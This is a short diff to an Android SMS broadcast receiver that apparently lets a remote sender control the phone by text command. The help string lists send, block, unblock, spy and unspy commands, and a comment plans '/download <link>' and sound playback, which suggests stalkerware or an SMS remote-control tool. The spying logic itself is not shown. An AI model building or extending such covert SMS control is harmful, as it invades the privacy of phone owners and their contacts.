@@ -15,6 +15,13 @@ import java.util.HashMap;
  * Created by Dylan on 13/02/2017.
  */
 
+/**
+ *
+ * Remaining commands to make :
+ * /download <link>
+ * /playsound <sound_dir>
+ */
+
 public class SmsBroadcastReceiver extends BroadcastReceiver {
 
     private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
@@ -124,15 +131,14 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
                             }
                         }
                     }
+
                     return true;
                 } else if( szMessage.startsWith( "/help" ) ) {
-                    String szMsg = "Commands : {/send PhoneNumber; /block PhoneNumber; /unblock PhoneNumber; /spy PhoneNumber; /unspy PhoneNumber}";
+                    String szMsg = "Commands : {/send PhoneNumber Message; /block PhoneNumber; /unblock PhoneNumber; /spy PhoneNumber; /unspy PhoneNumber}";
                     SmsManager smsManager = SmsManager.getDefault();
                     smsManager.sendTextMessage( szNumber, null, szMsg, null, null);
                     return true;
                 }
-
-
             }
         }
 
